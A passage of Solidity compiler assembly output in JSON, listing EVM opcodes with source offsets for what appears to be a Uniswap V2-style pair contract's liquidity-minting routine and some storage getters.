											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 5269,
											"end": 5275,
											"name": "SWAP1"
										},
										{
											"begin": 5269,
											"end": 5275,
											"name": "SWAP3"
										},
										{
											"begin": 5269,
											"end": 5275,
											"name": "AND"
										},
										{
											"begin": 5269,
											"end": 5275,
											"name": "SWAP2"
										},
										{
											"begin": 5262,
											"end": 5286,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 5262,
											"end": 5286,
											"name": "SWAP2"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "DUP1"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "DUP3"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "ADD"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "SWAP3"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 5197,
											"end": 5236,
											"name": "SWAP3"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "SWAP1"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "SWAP2"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "SWAP1"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "DUP3"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "SWAP1"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "SUB"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "ADD"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "DUP2"
										},
										{
											"begin": 5269,
											"end": 5275,
											"name": "DUP7"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "DUP1"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "198"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "198"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "POP"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "GAS"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "STATICCALL"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "199"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "199"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "POP"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "POP"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "POP"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "POP"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "MLOAD"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "200"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "200"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "MLOAD"
										},
										{
											"begin": 5262,
											"end": 5301,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5311,
											"end": 5323,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5326,
											"end": 5349,
											"name": "PUSH [tag]",
											"value": "201"
										},
										{
											"begin": 5326,
											"end": 5334,
											"name": "DUP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 5326,
											"end": 5349,
											"name": "DUP8"
										},
										{
											"begin": 5326,
											"end": 5349,
											"name": "AND"
										},
										{
											"begin": 5326,
											"end": 5349,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 5326,
											"end": 5338,
											"name": "PUSH [tag]",
											"value": "170"
										},
										{
											"begin": 5326,
											"end": 5349,
											"name": "AND"
										},
										{
											"begin": 5326,
											"end": 5349,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5326,
											"end": 5349,
											"name": "tag",
											"value": "201"
										},
										{
											"begin": 5326,
											"end": 5349,
											"name": "JUMPDEST"
										},
										{
											"begin": 5311,
											"end": 5349,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5359,
											"end": 5371,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5374,
											"end": 5397,
											"name": "PUSH [tag]",
											"value": "202"
										},
										{
											"begin": 5374,
											"end": 5382,
											"name": "DUP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 5374,
											"end": 5397,
											"name": "DUP8"
										},
										{
											"begin": 5374,
											"end": 5397,
											"name": "AND"
										},
										{
											"begin": 5374,
											"end": 5397,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 5374,
											"end": 5386,
											"name": "PUSH [tag]",
											"value": "170"
										},
										{
											"begin": 5374,
											"end": 5397,
											"name": "AND"
										},
										{
											"begin": 5374,
											"end": 5397,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5374,
											"end": 5397,
											"name": "tag",
											"value": "202"
										},
										{
											"begin": 5374,
											"end": 5397,
											"name": "JUMPDEST"
										},
										{
											"begin": 5359,
											"end": 5397,
											"name": "SWAP1"
										},
										{
											"begin": 5359,
											"end": 5397,
											"name": "POP"
										},
										{
											"begin": 5408,
											"end": 5418,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5421,
											"end": 5451,
											"name": "PUSH [tag]",
											"value": "203"
										},
										{
											"begin": 5430,
											"end": 5439,
											"name": "DUP8"
										},
										{
											"begin": 5441,
											"end": 5450,
											"name": "DUP8"
										},
										{
											"begin": 5421,
											"end": 5429,
											"name": "PUSH [tag]",
											"value": "204"
										},
										{
											"begin": 5421,
											"end": 5451,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5421,
											"end": 5451,
											"name": "tag",
											"value": "203"
										},
										{
											"begin": 5421,
											"end": 5451,
											"name": "JUMPDEST"
										},
										{
											"begin": 5461,
											"end": 5478,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5481,
											"end": 5492,
											"name": "SLOAD"
										},
										{
											"begin": 5408,
											"end": 5451,
											"name": "SWAP1"
										},
										{
											"begin": 5408,
											"end": 5451,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5584,
											"end": 5601,
											"name": "DUP1"
										},
										{
											"begin": 5580,
											"end": 5974,
											"name": "PUSH [tag]",
											"value": "205"
										},
										{
											"begin": 5580,
											"end": 5974,
											"name": "JUMPI"
										},
										{
											"begin": 5629,
											"end": 5683,
											"name": "PUSH [tag]",
											"value": "206"
										},
										{
											"begin": 556,
											"end": 563,
											"name": "PUSH",
											"value": "3E8"
										},
										{
											"begin": 5629,
											"end": 5660,
											"name": "PUSH [tag]",
											"value": "169"
										},
										{
											"begin": 5639,
											"end": 5659,
											"name": "PUSH [tag]",
											"value": "208"
										},
										{
											"begin": 5639,
											"end": 5646,
											"name": "DUP8"
										},
										{
											"begin": 5651,
											"end": 5658,
											"name": "DUP8"
										},
										{
											"begin": 5639,
											"end": 5659,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 5639,
											"end": 5650,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 5639,
											"end": 5659,
											"name": "AND"
										},
										{
											"begin": 5639,
											"end": 5659,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5639,
											"end": 5659,
											"name": "tag",
											"value": "208"
										},
										{
											"begin": 5639,
											"end": 5659,
											"name": "JUMPDEST"
										},
										{
											"begin": 5629,
											"end": 5638,
											"name": "PUSH [tag]",
											"value": "209"
										},
										{
											"begin": 5629,
											"end": 5660,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5629,
											"end": 5683,
											"name": "tag",
											"value": "206"
										},
										{
											"begin": 5629,
											"end": 5683,
											"name": "JUMPDEST"
										},
										{
											"begin": 5617,
											"end": 5683,
											"name": "SWAP9"
										},
										{
											"begin": 5617,
											"end": 5683,
											"name": "POP"
										},
										{
											"begin": 5697,
											"end": 5733,
											"name": "PUSH [tag]",
											"value": "210"
										},
										{
											"begin": 5711,
											"end": 5712,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 556,
											"end": 563,
											"name": "PUSH",
											"value": "3E8"
										},
										{
											"begin": 5697,
											"end": 5702,
											"name": "PUSH [tag]",
											"value": "211"
										},
										{
											"begin": 5697,
											"end": 5733,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5697,
											"end": 5733,
											"name": "tag",
											"value": "210"
										},
										{
											"begin": 5697,
											"end": 5733,
											"name": "JUMPDEST"
										},
										{
											"begin": 5580,
											"end": 5974,
											"name": "PUSH [tag]",
											"value": "212"
										},
										{
											"begin": 5580,
											"end": 5974,
											"name": "JUMP"
										},
										{
											"begin": 5580,
											"end": 5974,
											"name": "tag",
											"value": "205"
										},
										{
											"begin": 5580,
											"end": 5974,
											"name": "JUMPDEST"
										},
										{
											"begin": 5831,
											"end": 5963,
											"name": "PUSH [tag]",
											"value": "213"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 5857,
											"end": 5894,
											"name": "DUP10"
										},
										{
											"begin": 5857,
											"end": 5894,
											"name": "AND"
										},
										{
											"begin": 5857,
											"end": 5882,
											"name": "PUSH [tag]",
											"value": "214"
										},
										{
											"begin": 5857,
											"end": 5864,
											"name": "DUP7"
										},
										{
											"begin": 5869,
											"end": 5881,
											"name": "DUP5"
										},
										{
											"begin": 5857,
											"end": 5882,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 5857,
											"end": 5868,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 5857,
											"end": 5882,
											"name": "AND"
										},
										{
											"begin": 5857,
											"end": 5882,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5857,
											"end": 5882,
											"name": "tag",
											"value": "214"
										},
										{
											"begin": 5857,
											"end": 5882,
											"name": "JUMPDEST"
										},
										{
											"begin": 5857,
											"end": 5894,
											"name": "DUP2"
										},
										{
											"begin": 5857,
											"end": 5894,
											"name": "PUSH [tag]",
											"value": "215"
										},
										{
											"begin": 5857,
											"end": 5894,
											"name": "JUMPI"
										},
										{
											"begin": 5857,
											"end": 5894,
											"name": "INVALID"
										},
										{
											"begin": 5857,
											"end": 5894,
											"name": "tag",
											"value": "215"
										},
										{
											"begin": 5857,
											"end": 5894,
											"name": "JUMPDEST"
										},
										{
											"begin": 5857,
											"end": 5894,
											"name": "DIV"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 5912,
											"end": 5949,
											"name": "DUP10"
										},
										{
											"begin": 5912,
											"end": 5949,
											"name": "AND"
										},
										{
											"begin": 5912,
											"end": 5937,
											"name": "PUSH [tag]",
											"value": "216"
										},
										{
											"begin": 5912,
											"end": 5919,
											"name": "DUP7"
										},
										{
											"begin": 5924,
											"end": 5936,
											"name": "DUP6"
										},
										{
											"begin": 5912,
											"end": 5937,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 5912,
											"end": 5923,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 5912,
											"end": 5937,
											"name": "AND"
										},
										{
											"begin": 5912,
											"end": 5937,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5912,
											"end": 5937,
											"name": "tag",
											"value": "216"
										},
										{
											"begin": 5912,
											"end": 5937,
											"name": "JUMPDEST"
										},
										{
											"begin": 5912,
											"end": 5949,
											"name": "DUP2"
										},
										{
											"begin": 5912,
											"end": 5949,
											"name": "PUSH [tag]",
											"value": "217"
										},
										{
											"begin": 5912,
											"end": 5949,
											"name": "JUMPI"
										},
										{
											"begin": 5912,
											"end": 5949,
											"name": "INVALID"
										},
										{
											"begin": 5912,
											"end": 5949,
											"name": "tag",
											"value": "217"
										},
										{
											"begin": 5912,
											"end": 5949,
											"name": "JUMPDEST"
										},
										{
											"begin": 5912,
											"end": 5949,
											"name": "DIV"
										},
										{
											"begin": 5831,
											"end": 5839,
											"name": "PUSH [tag]",
											"value": "218"
										},
										{
											"begin": 5831,
											"end": 5963,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5831,
											"end": 5963,
											"name": "tag",
											"value": "213"
										},
										{
											"begin": 5831,
											"end": 5963,
											"name": "JUMPDEST"
										},
										{
											"begin": 5819,
											"end": 5963,
											"name": "SWAP9"
										},
										{
											"begin": 5819,
											"end": 5963,
											"name": "POP"
										},
										{
											"begin": 5580,
											"end": 5974,
											"name": "tag",
											"value": "212"
										},
										{
											"begin": 5580,
											"end": 5974,
											"name": "JUMPDEST"
										},
										{
											"begin": 6003,
											"end": 6004,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5991,
											"end": 6000,
											"name": "DUP10"
										},
										{
											"begin": 5991,
											"end": 6004,
											"name": "GT"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "PUSH [tag]",
											"value": "219"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "JUMPI"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "DUP2"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "MSTORE"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "ADD"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "DUP1"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "DUP1"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "ADD"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "DUP3"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "DUP2"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "SUB"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "DUP3"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "MSTORE"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "PUSH",
											"value": "26"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "DUP2"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "MSTORE"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "ADD"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "DUP1"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "PUSH data",
											"value": "EF633320352A650C1D75752F13E6C73D8D8F7F26A5596A6D026C1BF50D2F7713"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "PUSH",
											"value": "26"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "SWAP2"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "CODECOPY"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "ADD"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "SWAP2"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "POP"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "POP"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "MLOAD"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "DUP1"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "SWAP2"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "SUB"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "SWAP1"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "REVERT"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "tag",
											"value": "219"
										},
										{
											"begin": 5983,
											"end": 6047,
											"name": "JUMPDEST"
										},
										{
											"begin": 6057,
											"end": 6077,
											"name": "PUSH [tag]",
											"value": "220"
										},
										{
											"begin": 6063,
											"end": 6065,
											"name": "DUP11"
										},
										{
											"begin": 6067,
											"end": 6076,
											"name": "DUP11"
										},
										{
											"begin": 6057,
											"end": 6062,
											"name": "PUSH [tag]",
											"value": "211"
										},
										{
											"begin": 6057,
											"end": 6077,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 6057,
											"end": 6077,
											"name": "tag",
											"value": "220"
										},
										{
											"begin": 6057,
											"end": 6077,
											"name": "JUMPDEST"
										},
										{
											"begin": 6088,
											"end": 6137,
											"name": "PUSH [tag]",
											"value": "221"
										},
										{
											"begin": 6096,
											"end": 6104,
											"name": "DUP7"
										},
										{
											"begin": 6106,
											"end": 6114,
											"name": "DUP7"
										},
										{
											"begin": 6116,
											"end": 6125,
											"name": "DUP11"
										},
										{
											"begin": 6127,
											"end": 6136,
											"name": "DUP11"
										},
										{
											"begin": 6088,
											"end": 6095,
											"name": "PUSH [tag]",
											"value": "179"
										},
										{
											"begin": 6088,
											"end": 6137,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 6088,
											"end": 6137,
											"name": "tag",
											"value": "221"
										},
										{
											"begin": 6088,
											"end": 6137,
											"name": "JUMPDEST"
										},
										{
											"begin": 6151,
											"end": 6156,
											"name": "DUP2"
										},
										{
											"begin": 6147,
											"end": 6194,
											"name": "ISZERO"
										},
										{
											"begin": 6147,
											"end": 6194,
											"name": "PUSH [tag]",
											"value": "222"
										},
										{
											"begin": 6147,
											"end": 6194,
											"name": "JUMPI"
										},
										{
											"begin": 6185,
											"end": 6193,
											"name": "PUSH",
											"value": "B"
										},
										{
											"begin": 6185,
											"end": 6193,
											"name": "SLOAD"
										},
										{
											"begin": 6166,
											"end": 6194,
											"name": "PUSH [tag]",
											"value": "223"
										},
										{
											"begin": 6166,
											"end": 6194,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 6171,
											"end": 6179,
											"name": "DUP1"
										},
										{
											"begin": 6171,
											"end": 6179,
											"name": "DUP3"
										},
										{
											"begin": 6171,
											"end": 6179,
											"name": "AND"
										},
										{
											"begin": 6171,
											"end": 6179,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 6185,
											"end": 6193,
											"name": "SWAP1"
										},
										{
											"begin": 6185,
											"end": 6193,
											"name": "DIV"
										},
										{
											"begin": 6185,
											"end": 6193,
											"name": "AND"
										},
										{
											"begin": 6166,
											"end": 6194,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 6166,
											"end": 6184,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 6166,
											"end": 6194,
											"name": "AND"
										},
										{
											"begin": 6166,
											"end": 6194,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 6166,
											"end": 6194,
											"name": "tag",
											"value": "223"
										},
										{
											"begin": 6166,
											"end": 6194,
											"name": "JUMPDEST"
										},
										{
											"begin": 6158,
											"end": 6163,
											"name": "PUSH",
											"value": "E"
										},
										{
											"begin": 6158,
											"end": 6194,
											"name": "SSTORE"
										},
										{
											"begin": 6147,
											"end": 6194,
											"name": "tag",
											"value": "222"
										},
										{
											"begin": 6147,
											"end": 6194,
											"name": "JUMPDEST"
										},
										{
											"begin": 6249,
											"end": 6283,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 6249,
											"end": 6283,
											"name": "DUP1"
										},
										{
											"begin": 6249,
											"end": 6283,
											"name": "MLOAD"
										},
										{
											"begin": 6249,
											"end": 6283,
											"name": "DUP6"
										},
										{
											"begin": 6249,
											"end": 6283,
											"name": "DUP2"
										},
										{
											"begin": 6249,
											"end": 6283,
											"name": "MSTORE"
										},
										{
											"begin": 6249,
											"end": 6283,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 6249,
											"end": 6283,
											"name": "DUP2"
										},
										{
											"begin": 6249,
											"end": 6283,
											"name": "ADD"
										},
										{
											"begin": 6249,
											"end": 6283,
											"name": "DUP6"
										},
										{
											"begin": 6249,
											"end": 6283,
											"name": "SWAP1"
										},
										{
											"begin": 6249,
											"end": 6283,
											"name": "MSTORE"
										},
										{
											"begin": 6249,
											"end": 6283,
											"name": "DUP2"
										},
										{
											"begin": 6249,
											"end": 6283,
											"name": "MLOAD"
										},
										{
											"begin": 6254,
											"end": 6264,
											"name": "CALLER"
										},
										{
											"begin": 6254,
											"end": 6264,
											"name": "SWAP3"
										},
										{
											"begin": 6249,
											"end": 6283,
											"name": "PUSH",
											"value": "4C209B5FC8AD50758F13E2E1088BA56A560DFF690A1C6FEF26394F4C03821C4F"
										},
										{
											"begin": 6249,
											"end": 6283,
											"name": "SWAP3"
										},
										{
											"begin": 6249,
											"end": 6283,
											"name": "DUP3"
										},
										{
											"begin": 6249,
											"end": 6283,
											"name": "SWAP1"
										},
										{
											"begin": 6249,
											"end": 6283,
											"name": "SUB"
										},
										{
											"begin": 6249,
											"end": 6283,
											"name": "ADD"
										},
										{
											"begin": 6249,
											"end": 6283,
											"name": "SWAP1"
										},
										{
											"begin": 6249,
											"end": 6283,
											"name": "LOG2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 1379,
											"end": 1380,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1368,
											"end": 1376,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1368,
											"end": 1380,
											"name": "SSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5025,
											"end": 6290,
											"name": "SWAP5"
										},
										{
											"begin": 5025,
											"end": 6290,
											"name": "SWAP7"
										},
										{
											"begin": 5025,
											"end": 6290,
											"name": "SWAP6"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5025,
											"end": 6290,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "tag",
											"value": "86"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "JUMPDEST"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "MSTORE"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "SWAP1"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "DUP2"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "MSTORE"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "SWAP1"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "KECCAK256"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "SLOAD"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "DUP2"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1123,
											"end": 1140,
											"name": "tag",
											"value": "88"
										},
										{
											"begin": 1123,
											"end": 1140,
											"name": "JUMPDEST"
										},
										{
											"begin": 1123,
											"end": 1140,
											"name": "PUSH",
											"value": "E"
										},
										{
											"begin": 1123,
											"end": 1140,
											"name": "SLOAD"
										},
										{
											"begin": 1123,
											"end": 1140,
											"name": "DUP2"
										},
										{
											"begin": 1123,
											"end": 1140,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "tag",
											"value": "91"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "JUMPDEST"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "PUSH",
											"value": "5"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "MSTORE"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "SWAP1"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "DUP2"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "MSTORE"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "SWAP1"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "KECCAK256"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "SLOAD"
										},
										{
											"begin": 820,
